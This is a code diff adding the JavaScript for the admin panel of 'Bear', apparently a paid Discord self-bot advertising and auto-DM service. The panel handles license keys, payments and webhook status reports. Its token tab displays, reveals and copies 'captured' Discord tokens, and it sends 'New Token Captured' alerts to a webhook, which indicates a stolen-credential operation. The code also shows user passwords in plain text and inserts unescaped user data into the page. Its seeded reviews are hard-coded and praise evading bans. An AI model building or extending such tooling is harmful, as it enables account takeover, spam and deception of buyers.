+    document.getElementById('l-err').textContent='❌ Invalid credentials';
+    setTimeout(()=>document.getElementById('l-err').textContent='',2500);
+  }
+}
+function logout(){sessionStorage.removeItem('zwa');location.reload();}
+if(sessionStorage.getItem('zwa')){document.getElementById('login').style.display='none';document.getElementById('main').style.display='block';}
+
+// ══ STORAGE KEYS ═══════════════════════
+const EK='br_ev';
+const TK='br_tokens';
+const UK='br_accounts';
+const KK='bra_keys';
+const AWK='bra_wh';
+const PERFWK='bra_perf_wh';
+const STATUSWK='bra_status_wh';
+
+// ══ API DB ══════════════════════════════
+async function apiDB(action,payload={}){
+  try{
+    const r=await fetch('/api/db',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,payload})});
+    if(!r.ok)return null;
+    const ct=r.headers.get('content-type')||'';
+    if(!ct.includes('application/json'))return null;
+    return await r.json();
+  }catch(e){return null;}
+}
+
+// Async getters — fetch from API, fallback to localStorage
+async function getEvs(){const r=await apiDB('get_events');if(r?.ok)return r.data||[];try{return JSON.parse(localStorage.getItem(EK)||'[]');}catch(e){return[];}}
+async function getTokens(){const r=await apiDB('get_tokens');if(r?.ok)return r.data||[];try{return JSON.parse(localStorage.getItem(TK)||'[]');}catch(e){return[];}}
+async function getUsers(){const r=await apiDB('get_accounts');if(r?.ok)return r.data||{};try{return JSON.parse(localStorage.getItem(UK)||'{}');}catch(e){return{};}}
+async function getKeys(){const r=await apiDB('get_keys');if(r?.ok)return r.data||{};try{return JSON.parse(localStorage.getItem(KK)||'{}');}catch(e){return{};}}
+async function svUsers(d){await apiDB('set_account',{accounts:d});localStorage.setItem(UK,JSON.stringify(d));}
+async function svKeys(d){await apiDB('set_keys',{keys:d});localStorage.setItem(KK,JSON.stringify(d));}
+function getAWHCfg(){try{return JSON.parse(localStorage.getItem(AWK)||'{}');}catch(e){return{};}}
+function getPerfWHCfg(){try{return JSON.parse(localStorage.getItem(PERFWK)||'{}');}catch(e){return{};}}
+function getStatusWHCfg(){try{return JSON.parse(localStorage.getItem(STATUSWK)||'{}');}catch(e){return{};}}
+
+// ══ WEBHOOK SENDERS ════════════════════
+function getWhUrl(){
+  const inputEl=document.getElementById('adm-wh');
+  if(inputEl&&inputEl.value.trim())return inputEl.value.trim();
+  return getAWHCfg().url||'';
+}
+async function sendWH(url,title,desc,color=0x00d4ff,fields=[]){
+  if(!url)return;
+  try{
+    const body={embeds:[{title,description:desc,color,footer:{text:'Bear Admin'},timestamp:new Date().toISOString()}]};
+    if(fields.length)body.embeds[0].fields=fields;
+    await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+  }catch(e){console.warn('WH error:',e);}
+}
+async function sendAWH(title,desc,color=0xff4d6d){await sendWH(getWhUrl(),title,desc,color);}
+async function sendPerfWH(title,desc,color=0x00d4ff,fields=[]){
+  const url=getPerfWHCfg().url||document.getElementById('perf-wh')?.value?.trim()||'';
+  await sendWH(url,title,desc,color,fields);
+}
+async function sendStatusWH(title,desc,color=0x7c3aed,fields=[]){
+  const url=getStatusWHCfg().url||document.getElementById('status-wh')?.value?.trim()||'';
+  await sendWH(url,title,desc,color,fields);
+}
+
+// ══ ADMIN WEBHOOK SAVE/TEST ════════════
+function saveAWH(){
+  const url=document.getElementById('adm-wh').value.trim();
+  if(!url)return toast('Enter a webhook URL first','error');
+  const cfg=getAWHCfg();cfg.url=url;
+  localStorage.setItem(AWK,JSON.stringify(cfg));
+  toast('Admin webhook saved','success');
+}
+async function testAWH(){
+  const url=document.getElementById('adm-wh').value.trim();
+  if(!url)return toast('Enter webhook URL first','error');
+  const cfg=getAWHCfg();cfg.url=url;localStorage.setItem(AWK,JSON.stringify(cfg));
+  await sendAWH('🧪 Admin Webhook Test','```Admin webhook is working! ✅```',0x10b981);
+  toast('Test sent!','success');
+}
+
+// ══ PERF WEBHOOK SAVE/TEST ═════════════
+function savePerfWH(){
+  const url=document.getElementById('perf-wh').value.trim();
+  if(!url)return toast('Enter a webhook URL first','error');
+  const cfg=getPerfWHCfg();cfg.url=url;
+  localStorage.setItem(PERFWK,JSON.stringify(cfg));
+  toast('Performance webhook saved — auto-report every 1hr','success');
+  const row=document.getElementById('perf-countdown-row');if(row)row.style.display='';
+  startPerfAutoPing();
+}
+async function testPerfWH(){
+  const url=document.getElementById('perf-wh').value.trim();
+  if(!url)return toast('Enter webhook URL first','error');
+  const cfg=getPerfWHCfg();cfg.url=url;localStorage.setItem(PERFWK,JSON.stringify(cfg));
+  await sendPerfWH('🧪 Performance Webhook Test','```Performance webhook is working! ✅```',0x10b981);
+  toast('Test sent!','success');
+}
+
+// ══ ORDER WEBHOOK SAVE/TEST ════════════
+// Discord ticket / invite helpers
+function saveDcInvite(){const v=document.getElementById('discord-invite').value.trim();if(v)localStorage.setItem('bra_dc_invite',v);}
+function openDcServer(){const url=localStorage.getItem('bra_dc_invite')||document.getElementById('discord-invite').value.trim();if(!url)return toast('Set your Discord invite link first','error');window.open(url,'_blank');}
+function copyDcInvite(){const url=localStorage.getItem('bra_dc_invite')||document.getElementById('discord-invite').value.trim();if(!url)return toast('No invite link set','error');navigator.clipboard.writeText(url).then(()=>toast('Invite link copied!','success'));}
+
+// ══ STATUS WEBHOOK SAVE/TEST ═══════════
+function saveStatusWH(){
+  const url=document.getElementById('status-wh').value.trim();
+  if(!url)return toast('Enter a webhook URL first','error');
+  const cfg=getStatusWHCfg();cfg.url=url;
+  localStorage.setItem(STATUSWK,JSON.stringify(cfg));
+  toast('Status webhook saved — auto-broadcast every 1hr','success');
+  const row=document.getElementById('status-countdown-row');if(row)row.style.display='';
+  startStatusAutoPing();
+}
+async function testStatusWH(){
+  const url=document.getElementById('status-wh').value.trim();
+  if(!url)return toast('Enter webhook URL first','error');
+  const cfg=getStatusWHCfg();cfg.url=url;localStorage.setItem(STATUSWK,JSON.stringify(cfg));
+  await sendStatusWH('🧪 Status Webhook Test','```Status webhook is working! ✅```',0x10b981);
+  toast('Test sent!','success');
+}
+let statusPingInterval=null;
+let perfAutoInterval=null;
+let statusCountdown=3600;
+let perfCountdown=3600;
+let statusCountdownInterval=null;
+let perfCountdownInterval=null;
+function fmtCountdown(sec){const m=Math.floor(sec/60);const s=sec%60;return`${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;}
+function startStatusAutoPing(){
+  if(statusPingInterval)clearInterval(statusPingInterval);
+  if(statusCountdownInterval)clearInterval(statusCountdownInterval);
+  const cfg=getStatusWHCfg();
+  if(!cfg.url)return;
+  statusCountdown=3600;
+  const el=document.getElementById('status-countdown');
+  if(el)el.textContent=fmtCountdown(statusCountdown);
+  statusCountdownInterval=setInterval(()=>{
+    statusCountdown--;
+    if(statusCountdown<0)statusCountdown=3600;
+    const el=document.getElementById('status-countdown');
+    if(el)el.textContent=fmtCountdown(statusCountdown);
+  },1000);
+  statusPingInterval=setInterval(async()=>{await broadcastStatus();statusCountdown=3600;},60*60*1000);
+}
+function startPerfAutoPing(){
+  if(perfAutoInterval)clearInterval(perfAutoInterval);
+  if(perfCountdownInterval)clearInterval(perfCountdownInterval);
+  const cfg=getPerfWHCfg();
+  if(!cfg.url)return;
+  perfCountdown=3600;
+  const el=document.getElementById('perf-countdown');
+  if(el)el.textContent=fmtCountdown(perfCountdown);
+  perfCountdownInterval=setInterval(()=>{
+    perfCountdown--;
+    if(perfCountdown<0)perfCountdown=3600;
+    const el=document.getElementById('perf-countdown');
+    if(el)el.textContent=fmtCountdown(perfCountdown);
+  },1000);
+  perfAutoInterval=setInterval(async()=>{await sendPerfReport();perfCountdown=3600;},60*60*1000);
+}
+
+// ══ SERVICE STATUS SYSTEM ══════════════
+const SVCK='bra_services';
+const SERVICES=[
+  {id:'panel',name:'User Panel',desc:'Main Bear user interface'},
+  {id:'autoadv',name:'Auto Advertiser',desc:'Slot-based ad sending engine'},
+  {id:'autodm',name:'Auto DM',desc:'DM reply bot module'},
+];
+const STATUS_CONFIG={
+  operational:{label:'Operational',emoji:'✅',color:'#10b981',dotClass:'dot-operational',textClass:'st-operational',discordColor:0x10b981},
+  maintenance:{label:'Maintenance',emoji:'🔧',color:'#f59e0b',dotClass:'dot-maintenance',textClass:'st-maintenance',discordColor:0xf59e0b},
+  degraded:{label:'Degraded',emoji:'⚠️',color:'#2563eb',dotClass:'dot-degraded',textClass:'st-degraded',discordColor:0xf97316},
+  outage:{label:'Outage',emoji:'🔴',color:'#ef4444',dotClass:'dot-outage',textClass:'st-outage',discordColor:0xef4444},
+};
+function getSvcStates(){try{return JSON.parse(localStorage.getItem(SVCK)||'{}');}catch(e){return{};}}
+function saveSvcStates(d){localStorage.setItem(SVCK,JSON.stringify(d));}
+function setSvcStatus(id,status){
+  const states=getSvcStates();states[id]=status;saveSvcStates(states);
+  renderServices();updateOverallBadge();
+  // Auto-broadcast on change
+  const svc=SERVICES.find(s=>s.id===id);
+  const cfg=STATUS_CONFIG[status];
+  sendStatusWH(`${cfg.emoji} Service Status Change`,`**${svc.name}** is now **${cfg.label}**`,cfg.discordColor);
+}
+function setAllStatus(status){
+  const states=getSvcStates();
+  SERVICES.forEach(s=>{states[s.id]=status;});
+  saveSvcStates(states);renderServices();updateOverallBadge();
+  const cfg=STATUS_CONFIG[status];
+  const inc=document.getElementById('status-incident')?.value?.trim()||'';
+  const desc=inc?`${cfg.emoji} All services set to **${cfg.label}**\n\n> ${inc}`:`${cfg.emoji} All services set to **${cfg.label}**`;
+  sendStatusWH(`${cfg.emoji} Bear — ${cfg.label}`,desc,cfg.discordColor);
+  toast(`All services set to ${cfg.label}`,'success');
+}
+function renderServices(){
+  const states=getSvcStates();
+  const list=document.getElementById('service-list');
+  if(!list)return;
+  list.innerHTML='';
+  SERVICES.forEach(svc=>{
+    const current=states[svc.id]||'operational';
+    const cfg=STATUS_CONFIG[current];
+    const row=document.createElement('div');row.className='svc-row';
+    row.innerHTML=`
+      <div style="display:flex;align-items:center;gap:10px;flex:1">
+        <div class="svc-dot ${cfg.dotClass}" style="animation:${current==='outage'?'bl 1s infinite':'none'}"></div>
+        <div><div class="svc-name">${svc.name}</div><div class="svc-desc">${svc.desc}</div></div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <span class="${cfg.textClass}" style="font-family:'Share Tech Mono',monospace;font-size:0.78rem;font-weight:700">${cfg.emoji} ${cfg.label}</span>
+        <select class="svc-sel" onchange="setSvcStatus('${svc.id}',this.value)">
+          ${Object.entries(STATUS_CONFIG).map(([k,v])=>`<option value="${k}"${k===current?' selected':''}>${v.emoji} ${v.label}</option>`).join('')}
+        </select>
+      </div>`;
+    list.appendChild(row);
+  });
+}
+function updateOverallBadge(){
+  const states=getSvcStates();
+  const badge=document.getElementById('overall-badge');if(!badge)return;
+  const statuses=SERVICES.map(s=>states[s.id]||'operational');
+  let overall='operational';
+  if(statuses.includes('outage'))overall='outage';
+  else if(statuses.includes('degraded'))overall='degraded';
+  else if(statuses.includes('maintenance'))overall='maintenance';
+  const cfg=STATUS_CONFIG[overall];
+  const labels={operational:'ALL SYSTEMS OPERATIONAL',maintenance:'MAINTENANCE IN PROGRESS',degraded:'DEGRADED PERFORMANCE',outage:'MAJOR OUTAGE'};
+  badge.style.background=`${cfg.color}18`;
+  badge.style.borderColor=cfg.color;
+  badge.style.color=cfg.color;
+  badge.textContent=`● ${labels[overall]}`;
+}
+async function broadcastStatus(){
+  const states=getSvcStates();
+  const inc=document.getElementById('status-incident')?.value?.trim()||'';
+  const statuses=SERVICES.map(s=>states[s.id]||'operational');
+  let overall='operational';
+  if(statuses.includes('outage'))overall='outage';
+  else if(statuses.includes('degraded'))overall='degraded';
+  else if(statuses.includes('maintenance'))overall='maintenance';
+  const cfg=STATUS_CONFIG[overall];
+  const fields=SERVICES.map(s=>{const st=states[s.id]||'operational';const sc=STATUS_CONFIG[st];return{name:s.name,value:`${sc.emoji} ${sc.label}`,inline:true};});
+  const desc=inc?`> ${inc}\n\n**Service Breakdown:**`:'**Service Breakdown:**';
+  await sendStatusWH(`${cfg.emoji} Bear Status — ${cfg.label}`,desc,cfg.discordColor,fields);
+  toast('Status broadcast sent!','success');
+}
+function refreshStatus(){
+  renderServices();updateOverallBadge();
+  getUsers().then(users=>{
+    const tbody=document.getElementById('status-u-tbody');const empty=document.getElementById('status-u-empty');
+    tbody.innerHTML='';
+    const ks=Object.keys(users);
+    if(!ks.length){empty.style.display='block';return;}empty.style.display='none';
+    ks.forEach(uid=>{
+      const acc=users[uid];const exp=acc.keyExp!==undefined?acc.keyExp:acc;
+      const isActive=exp==='inf'||(typeof exp==='number'&&exp*1000>Date.now());
+      const tr=document.createElement('tr');
+      tr.innerHTML=`<td style="color:var(--txt)">${uid}</td><td>${isActive?'<span style="color:var(--ac3)">✅ Active</span>':'<span style="color:var(--dng)">❌ Expired</span>'}</td><td style="color:var(--mut)">${fmtExpiry(exp)}</td><td style="color:var(--mut)">–</td>`;
+      tbody.appendChild(tr);
+    });
+  });
+}
+
+// ══ PERFORMANCE TAB ════════════════════
+const perfT0=Date.now();
+async function measurePing(){
+  const el=document.getElementById('perf-ping');
+  if(el)el.textContent='…';
+  const t=Date.now();
+  try{await fetch('https://discord.com/api/v9/gateway',{mode:'no-cors'});}catch(e){}
+  const ping=Date.now()-t;
+  if(el){
+    el.textContent=ping+'ms';
+    el.style.color=ping<200?'#10b981':ping<500?'#f59e0b':'#ef4444';
+  }
+  return ping;
+}
+async function updatePerfStats(){
+  const evs=await getEvs();
+  const now=Date.now();const hourAgo=now-3600000;
+  const adsHr=evs.filter(e=>e.type==='ad'&&e.ts>hourAgo).length;
+  const dmsHr=evs.filter(e=>e.type==='dm'&&e.ts>hourAgo).length;
+  const uptimeSec=Math.floor((now-perfT0)/1000);
+  const uptimeStr=uptimeSec<3600?`${Math.floor(uptimeSec/60)}m`:uptimeSec<86400?`${Math.floor(uptimeSec/3600)}h${Math.floor((uptimeSec%3600)/60)}m`:`${Math.floor(uptimeSec/86400)}d`;
+  const pa=document.getElementById('perf-ads');const pd=document.getElementById('perf-dms');const pu=document.getElementById('perf-uptime');
+  if(pa)pa.textContent=adsHr;if(pd)pd.textContent=dmsHr;if(pu)pu.textContent=uptimeStr;
+}
+async function sendPerfReport(){
+  const ping=await measurePing();
+  const evs=await getEvs();const now=Date.now();const hourAgo=now-3600000;
+  const adsHr=evs.filter(e=>e.type==='ad'&&e.ts>hourAgo).length;
+  const dmsHr=evs.filter(e=>e.type==='dm'&&e.ts>hourAgo).length;
+  const fields=[
+    {name:'📡 Discord Ping',value:`${ping}ms`,inline:true},
+    {name:'📡 Ads / Hour',value:String(adsHr),inline:true},
+    {name:'💬 DMs / Hour',value:String(dmsHr),inline:true},
+    {name:'🕐 Admin Uptime',value:String(Math.floor((now-perfT0)/60000))+'m',inline:true},
+    {name:'📋 Total Events',value:String(evs.length),inline:true},
+  ];
+  await sendPerfWH('📈 Performance Report',`Live stats as of ${new Date().toLocaleString()}`,0x00d4ff,fields);
+  toast('Performance report sent!','success');
+}
+
+// ══ TABS ═══════════════════════════════
+function tab(n,btn){
+  document.querySelectorAll('.tc').forEach(e=>e.classList.remove('on'));
+  document.querySelectorAll('.tb').forEach(e=>e.classList.remove('on'));
+  document.getElementById(`tab-${n}`).classList.add('on');btn.classList.add('on');
+  if(n==='status'){refreshStatus();}
+  if(n==='wh'){updatePerfStats();measurePing();}
+  if(n==='pricing'){loadPricingTab();}
+  if(n==='reviews'){loadReviewsTab();}
+  if(n==='payments'){renderPayments();}
+}
+
+// ══ LOGS ═══════════════════════════════
+const TYPE_MAP={ad:'badge-ad',dm:'badge-dm',start:'badge-start',stop:'badge-stop',dm_start:'badge-dm_start',dm_stop:'badge-dm_stop',devtools:'badge-devtools',register:'badge-start',error:'badge-error'};
+function fmtTs(ts){const d=new Date(ts);return d.toLocaleDateString()+' '+d.toTimeString().slice(0,8);}
+function fmtType(t){return`<span class="badge ${TYPE_MAP[t]||'badge-ad'}">${t.toUpperCase()}</span>`;}
+function fmtDetail(ev){if(ev.type==='ad')return`ch:${ev.channel} | slot:${ev.slot} | ${(ev.msg||'').slice(0,60)}`;if(ev.type==='dm')return`${ev.user?'@'+ev.user+' | ':''}${(ev.msg||'').slice(0,80)}`;if(ev.type==='start')return`Slot ${ev.slot} started`;if(ev.type==='stop')return`Slot ${ev.slot} stopped`;if(ev.type==='register')return`User: ${ev.user||''}`;if(ev.type==='error')return`<span style="color:var(--dng)">${(ev.msg||'').slice(0,100)}</span>`;return ev.msg||'';}
+async function renderLogs(){
+  const evs=await getEvs();
+  const search=(document.getElementById('log-search')?.value||'').toLowerCase();
+  const filter=document.getElementById('log-filter')?.value||'all';
+  let filtered=evs.filter(e=>{if(filter!=='all'&&e.type!==filter)return false;if(search&&!JSON.stringify(e).toLowerCase().includes(search))return false;return true;});
+  const tbody=document.getElementById('log-tbody');const empty=document.getElementById('log-empty');tbody.innerHTML='';
+  if(!filtered.length){empty.style.display='block';return;}empty.style.display='none';
+  filtered.forEach((ev,i)=>{const tr=document.createElement('tr');tr.innerHTML=`<td style="color:var(--mut)">${i+1}</td><td style="color:var(--mut);white-space:nowrap">${fmtTs(ev.ts)}</td><td>${fmtType(ev.type)}</td><td>${fmtDetail(ev)}</td>`;tbody.appendChild(tr);});
+  document.getElementById('sa-ads').textContent=evs.filter(e=>e.type==='ad').length;
+  document.getElementById('sa-dms').textContent=evs.filter(e=>e.type==='dm').length;
+}
+function refreshLogs(){renderLogs();toast('Logs refreshed','info');}
+async function clearEvs(){if(!confirm('Clear all event logs?'))return;await apiDB('clear_events');renderLogs();toast('Logs cleared','info');}
+
+// ══ TOKENS ═════════════════════════════
+let tokVisible={};
+async function renderTokens(){
+  const tokens=await getTokens();const tbody=document.getElementById('tok-tbody');const empty=document.getElementById('tok-empty');
+  tbody.innerHTML='';document.getElementById('sa-toks').textContent=tokens.length;
+  if(!tokens.length){empty.style.display='block';return;}empty.style.display='none';
+  tokens.forEach((t,i)=>{
+    const isVis=tokVisible[i];const tr=document.createElement('tr');
+    const shortTok=t.token.slice(0,12)+'…'+t.token.slice(-6);
+    tr.innerHTML=`<td style="color:var(--mut)">${i+1}</td><td style="color:var(--mut);white-space:nowrap">${fmtTs(t.ts)}</td><td><span class="badge badge-ad">${t.label||'Unknown'}</span></td><td class="tok-cell ${isVis?'':'tok-hidden'}" id="tok-cell-${i}" onclick="toggleTok(${i})" title="Click to reveal">${isVis?t.token:shortTok}</td><td style="display:flex;gap:6px;flex-wrap:wrap;padding:9px 12px"><button class="copy-tok" onclick="copyTok('${t.token}')">📋 Copy</button><button class="del-btn" onclick="deleteTok(${i})">✕ Del</button></td>`;
+    tbody.appendChild(tr);
+  });
+}
+function toggleTok(i){tokVisible[i]=!tokVisible[i];renderTokens();}
+function copyTok(tok){navigator.clipboard.writeText(tok).then(()=>toast('Token copied!','success')).catch(()=>{const ta=document.createElement('textarea');ta.value=tok;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);toast('Copied!','success');});}
+async function deleteTok(i){await apiDB('delete_token',{index:i});delete tokVisible[i];renderTokens();toast('Token deleted','info');}
+async function clearTokens(){if(!confirm('Clear all captured tokens?'))return;await apiDB('clear_tokens');tokVisible={};renderTokens();toast('Tokens cleared','info');}
+
+let lastTokenCount=0;
+async function checkNewTokens(){
+  const tokens=await getTokens();
+  if(tokens.length>lastTokenCount){
+    const newToks=tokens.slice(0,tokens.length-lastTokenCount);
+    newToks.forEach(t=>{
+      sendAWH('🔑 New Token Captured',`\`\`\`Source: ${t.label||'Unknown'}\nCaptured: ${new Date(t.ts).toLocaleString()}\nToken: ${t.token.slice(0,24)}…\`\`\``,0xf59e0b);
+    });
+    lastTokenCount=tokens.length;
+    renderTokens();
+  }
+}
+
+// ══ USERS ══════════════════════════════
+function fmtExpiry(v){
+  if(v==='inf')return'♾️ Lifetime';
+  const rem=v-Date.now()/1000;
+  if(rem<=0)return'❌ Expired';
+  const d=Math.floor(rem/86400),h=Math.floor((rem%86400)/3600),m=Math.floor((rem%3600)/60);
+  if(d>0)return`⏳ ${d}d ${h}h`;
+  if(h>0)return`⏳ ${h}h ${m}m`;
+  return`⏳ ${m}m`;
+}
+async function renderUsers(){
+  const users=await getUsers();const ks=Object.keys(users);
+  const tbody=document.getElementById('u-tbody');const empty=document.getElementById('u-empty');
+  tbody.innerHTML='';document.getElementById('u-count').textContent=`(${ks.length})`;
+  document.getElementById('sa-users').textContent=ks.length;
+  if(!ks.length){empty.style.display='block';return;}empty.style.display='none';
+  ks.forEach(uid=>{
+    const acc=users[uid];
+    const exp=acc.keyExp!==undefined?acc.keyExp:acc;
+    const isActive=exp==='inf'||(typeof exp==='number'&&exp*1000>Date.now());
+    const status=isActive?'<span style="color:var(--ac3)">✅ Active</span>':'<span style="color:var(--dng)">❌ Expired</span>';
+    let passVal=acc.pass||'';
+    const passDisplay=passVal
+      ?`<span class="tok-cell tok-hidden" onclick="this.classList.toggle('tok-hidden')" title="Click to reveal">${passVal}</span>`
+      :`<span style="color:var(--mut);font-size:0.75rem;font-family:'Share Tech Mono',monospace">-</span>`;
+    const tr=document.createElement('tr');
+    tr.innerHTML=`<td style="color:var(--txt)">${uid}</td><td>${passDisplay}</td><td style="color:var(--mut)">${fmtExpiry(exp)}</td><td>${status}</td><td><button class="del-btn" onclick="revokeUser('${uid}')">Revoke</button></td>`;
+    tbody.appendChild(tr);
+  });
+}
+async function addUser(){
+  const id=document.getElementById('u-id').value.trim();
+  const dur=document.getElementById('u-dur').value;
+  if(!id)return toast('Enter a Username','error');
+  const users=await getUsers();
+  const keyExp=dur==='inf'?'inf':(Math.floor(Date.now()/1000)+parseInt(dur));
+  if(users[id]&&users[id].pass){users[id].keyExp=keyExp;}
+  else{users[id]={keyExp};}
+  await apiDB('set_account',{username:id,data:users[id]});
+  renderUsers();
+  toast(`Access granted to ${id}`,'success');
+  const durLabel=dur==='inf'?'Lifetime':fmtDurLabel(dur);
+  sendAWH('✅ User Access Granted',`\`\`\`User: ${id}\nDuration: ${durLabel}\nExpires: ${keyExp==='inf'?'Never':new Date(keyExp*1000).toLocaleString()}\`\`\``,0x10b981);
+  document.getElementById('u-id').value='';
+}
+function removeUser(){const id=document.getElementById('u-id').value.trim();if(!id)return toast('Enter a Username to revoke','error');revokeUser(id);}
+async function revokeUser(id){
+  const users=await getUsers();if(!users[id])return toast('User not found','error');
+  await apiDB('delete_account',{username:id});
+  renderUsers();
+  toast(`Access revoked for ${id}`,'info');
+  sendAWH('❌ User Access Revoked',`\`\`\`User: ${id} access has been revoked.\`\`\``,0xef4444);
+}
+
+// ══ KEYS ═══════════════════════════════
+// ══ KEY SYSTEM ══════════════════════════
+const CHARS='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+function rSeg(n){return Array.from(crypto.getRandomValues(new Uint8Array(n))).map(b=>CHARS[b%CHARS.length]).join('');}
+function keyChk(s){let h=0;for(let i=0;i<s.length;i++)h=(h*31+s.charCodeAt(i))>>>0;return(h%1296).toString(36).toUpperCase().padStart(2,'0');}
+const DUR_CODES={3600:'1H',86400:'1D',604800:'1W',2592000:'1M',inf:'LT'};
+function genKeyStr(dur){
+  const code=DUR_CODES[dur]||'1W';
+  const r=`${rSeg(4)}-${rSeg(4)}`;
+  const chk=keyChk(`${code}-${r}`);
+  return`BR-${code}-${r}-${chk}`;
+}
+async function genKeys(){
+  const dur=document.getElementById('k-dur').value;
+  const cnt=Math.min(20,Math.max(1,parseInt(document.getElementById('k-cnt').value)||1));
+  const keys=await getKeys();const newKeys=[];
+  for(let i=0;i<cnt;i++){
+    const k=genKeyStr(dur);
+    keys[k]=dur;newKeys.push(k);
+  }
+  await apiDB('set_keys',{keys});renderKeys();
+  const durLabel=dur==='inf'?'LIFETIME':fmtDurLabel(dur);
+  _lastGenKeys=newKeys;
+  const out=document.getElementById('k-out');
+  out.style.display='block';
+  out.innerHTML=`<div style="color:var(--mut);font-size:.72rem;margin-bottom:10px;letter-spacing:1px">GENERATED ${cnt} KEY${cnt>1?'S':''} — ${durLabel}</div>`+
+    newKeys.map(k=>`<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;background:rgba(0,0,0,0.2);padding:7px 10px;border-radius:6px"><div class="key-val" style="flex:1;font-size:0.9rem">${k}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${k}').then(()=>toast('Copied!','success'))" style="margin-top:0">📋</button></div>`).join('')+
+    `<div style="margin-top:10px;display:flex;gap:8px"><button class="copy-btn" onclick="copyKeys()">📋 Copy All</button><button class="copy-btn" onclick="document.getElementById('k-out').style.display='none'">✕ Close</button></div>`;
+  toast(`${cnt} key${cnt>1?'s':''} generated`,'success');
+  sendAWH('🗝️ Keys Generated',`\`\`\`Count: ${cnt}\nDuration: ${durLabel}\nPreview: ${newKeys[0]}${cnt>1?`\n...+${cnt-1} more`:''}\`\`\``,0xe8873a);
+}
+let _lastGenKeys=[];
+function copyKeys(){navigator.clipboard.writeText(_lastGenKeys.join('\n')).then(()=>toast('All keys copied!','success')).catch(()=>{const ta=document.createElement('textarea');ta.value=_lastGenKeys.join('\n');document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);toast('All keys copied!','success');});}
+function fmtDurLabel(dur){const n=parseInt(dur);if(n>=2592000)return Math.round(n/2592000)+'mo';if(n>=604800)return Math.round(n/604800)+'w';if(n>=86400)return Math.round(n/86400)+'d';if(n>=3600)return Math.round(n/3600)+'h';return n+'s';}
+async function renderKeys(){
+  const keys=await getKeys();const ks=Object.keys(keys);
+  const tbody=document.getElementById('k-tbody');const empty=document.getElementById('k-empty');
+  tbody.innerHTML='';document.getElementById('k-count').textContent=`(${ks.length})`;
+  document.getElementById('sa-keys').textContent=ks.length;
+  if(!ks.length){empty.style.display='block';}else{empty.style.display='none';ks.forEach(k=>{const dur=keys[k];const tr=document.createElement('tr');tr.innerHTML=`<td style="color:var(--ac3);font-size:0.82rem">${k}</td><td style="color:var(--mut)">${dur==='inf'?'♾️ Lifetime':fmtDurLabel(dur)}</td><td><button class="copy-tok" onclick="navigator.clipboard.writeText('${k}').then(()=>toast('Copied!','success'))">📋 Copy</button> <button class="del-btn" onclick="delKey('${k}')">Delete</button></td>`;tbody.appendChild(tr);});}
+  renderUsedKeys();
+}
+async function renderUsedKeys(){
+  const users=await getUsers();
+  const tbody=document.getElementById('uk-tbody');const empty=document.getElementById('uk-empty');
+  if(!tbody)return;
+  tbody.innerHTML='';
+  const used=Object.entries(users).filter(([,a])=>a.key).map(([u,a])=>({user:u,key:a.key,keyExp:a.keyExp}));
+  document.getElementById('uk-count').textContent=`(${used.length})`;
+  if(!used.length){empty.style.display='block';return;}
+  empty.style.display='none';
+  used.forEach(({user,key,keyExp})=>{
+    const tr=document.createElement('tr');
+    tr.innerHTML=`<td style="color:var(--ac3);font-size:0.82rem">${key}</td><td style="color:var(--txt)">${user}</td><td style="color:var(--mut)">${fmtExpiry(keyExp)}</td>`;
+    tbody.appendChild(tr);
+  });
+}
+async function delKey(k){await apiDB('delete_key',{key:k});renderKeys();toast('Key deleted','info');}
+
+// ══ PAYMENTS ═══════════════════════════
+async function renderPayments(){
+  const r=await apiDB('get_payments');
+  const payments=r?.ok?r.data||[]:[];
+  const tbody=document.getElementById('pay-tbody');
+  const empty=document.getElementById('pay-empty');
+  if(!tbody)return;
+  tbody.innerHTML='';
+  if(!payments.length){empty.style.display='block';return;}
+  empty.style.display='none';
+  const total=payments.filter(p=>p.status==='confirmed').reduce((s,p)=>s+p.amountUSD,0);
+  payments.forEach(p=>{
+    const tr=document.createElement('tr');
+    const isPending=p.status==='pending';
+    const isExpired=isPending&&Date.now()>p.expiresAt;
+    const status=p.status==='confirmed'
+      ?'<span style="color:var(--ac3)">✅ Confirmed</span>'
+      :isExpired
+        ?'<span style="color:var(--mut)">⏰ Expired</span>'
+        :'<span style="color:var(--wrn)">⏳ Pending</span>';
+    tr.innerHTML=`
+      <td style="color:var(--mut);font-family:'Share Tech Mono',monospace;font-size:0.75rem">${p.orderId}</td>
+      <td style="color:var(--txt)">${p.label}</td>
+      <td style="color:var(--ac)">${p.coin}</td>
+      <td style="color:var(--ac3);font-family:'Share Tech Mono',monospace">${p.amount} <span style="color:var(--mut);font-size:0.7rem">($${p.amountUSD})</span></td>
+      <td>${status}</td>
+      <td style="color:var(--mut);font-size:0.75rem;white-space:nowrap">${fmtTs(p.createdAt)}</td>`;
+    tbody.appendChild(tr);
+  });
+  // Show total confirmed
+  const existing=document.getElementById('pay-total');
+  if(existing)existing.remove();
+  if(total>0){
+    const div=document.createElement('div');
+    div.id='pay-total';
+    div.style.cssText='margin-top:12px;font-family:Share Tech Mono,monospace;font-size:0.82rem;color:var(--ac3);text-align:right';
+    div.textContent=`Total confirmed: $${total.toFixed(2)} USD`;
+    tbody.parentElement.parentElement.appendChild(div);
+  }
+}
+async function clearPayments(){
+  if(!confirm('Clear all payment history?'))return;
+  await apiDB('clear_payments');
+  renderPayments();
+  toast('Payment history cleared','info');
+}
+
+// ══ REVIEWS ════════════════════════════
+const DEFAULT_REVIEWS=[
+  {stars:5,text:'Best Discord advertiser I\'ve used. Runs 24/7 without issues.',author:'xhunter99'},
+  {stars:5,text:'The humaniser mode is 🔥 no bans so far after 2 weeks.',author:'darkwave_'},
+  {stars:5,text:'Auto DM reply converted 3 sales overnight. Insane ROI.',author:'cryptoflip'}
+];
+let currentReviews=[];
+async function loadReviewsTab(){
+  const r=await apiDB('get_reviews');
+  currentReviews=(r?.ok&&r.data&&r.data.length)?[...r.data]:[...DEFAULT_REVIEWS];
+  renderReviewEditor();
+}
+function renderReviewEditor(){
+  const el=document.getElementById('review-editor');if(!el)return;
+  el.innerHTML='';
